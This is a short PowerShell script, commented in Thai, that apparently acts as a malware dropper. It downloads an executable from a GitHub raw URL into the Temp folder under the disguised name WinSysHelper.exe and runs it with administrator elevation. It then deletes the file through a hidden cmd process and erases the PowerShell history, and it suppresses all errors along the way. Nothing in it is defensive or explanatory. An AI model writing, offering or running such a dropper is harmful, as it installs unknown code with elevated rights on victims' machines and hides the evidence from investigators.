$ErrorActionPreference = 'SilentlyContinue'

# 1. ตั้งที่อยู่ไฟล์ (ใช้ Temp แทนเพื่อความชัวร์ที่สุด)
$output = "$env:TEMP\WinSysHelper.exe"
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"

# 2. ดาวน์โหลดไฟล์
(New-Object System.Net.WebClient).DownloadFile($url, $output)

# 3. สั่งรันแบบ Admin และสั่งลบตัวเองทิ้งเบื้องหลัง
if (Test-Path $output) {
    # รัน EXE
    Start-Process -FilePath $output -Verb RunAs
    
    # สั่ง CMD มารอ 10 วินาทีแล้วค่อยลบไฟล์ทิ้ง (รันซ่อนไว้เบื้องหลัง)
    Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden
}

# 4. ลบประวัติ PowerShell
try { Remove-Item (Get-PSReadlineOption).HistorySavePath -Force } catch {}

# ปิดท้ายด้วยการปิด PowerShell
exit
